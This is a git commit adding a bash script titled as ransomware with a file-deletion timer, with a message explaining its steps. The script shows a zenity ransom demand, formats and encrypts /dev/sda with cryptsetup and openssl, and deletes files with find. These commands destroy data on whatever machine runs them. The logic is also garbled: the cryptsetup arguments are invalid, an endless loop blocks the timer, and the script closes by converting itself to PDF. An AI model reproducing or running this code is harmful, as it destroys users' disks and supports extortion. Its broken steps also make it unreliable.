237936386b941e52ce3a67884bd5e894e09fae91
CIPHER0930 <115630427+CIPHER0930@users.noreply.github.com>
2023-07-04 14:49:36 -0400

    Create Ransomeware-with-timer-and-sile-deletion.sh
    This code will first display a zenity dialog box with a message that the computer has been locked. It will then encrypt the /dev/sda device and start a loop that sleeps for 1 second. The zenity timer will ask the user to enter the time in minutes after which the encrypted files should be deleted. If the user enters 120, the timer will start counting down. When the timer reaches 0:00, the script will delete all encrypted files in the current directory. Finally, the script will convert the script.sh file to a script.pdf file.

---
+++ Ransomeware-with-timer-and-sile-deletion.sh
@@ -0,0 +1,25 @@
+#!/bin/bash
+
+zenity --info --title="Your computer has been locked" --text="This computer has been locked due to non-payment of ransom. To unlock your computer, please contact us at [email protected] and provide the following code: [code]" --modal --on-close="exit" --image="picture.jpg"
+
+cryptsetup luksFormat /dev/sda
+cryptsetup open /dev/sda crypt_luks
+openssl enc -aes-256-cbc -pbkdf2 -in /dev/sda -out encrypted_luks_header.bin
+cryptsetup encrypt /dev/sda encrypted_luks_header.bin
+cryptsetup encrypt /dev/sda encrypted_luks_header.bin
+
+while true; do
+sleep 1
+done
+#Add zenity timer
+
+zenity --entry --title="File Deletion Timer" --text="Enter the time in minutes: " --entry-text="120"
+#Check if time has reached 0:00
+
+if [ "$1" -eq "0" ]; then
+#Delete all encrypted files
+
+find . -type f -name "*.encrypted" -delete
+
+fi
+convert --density 300 script.sh script.pdf
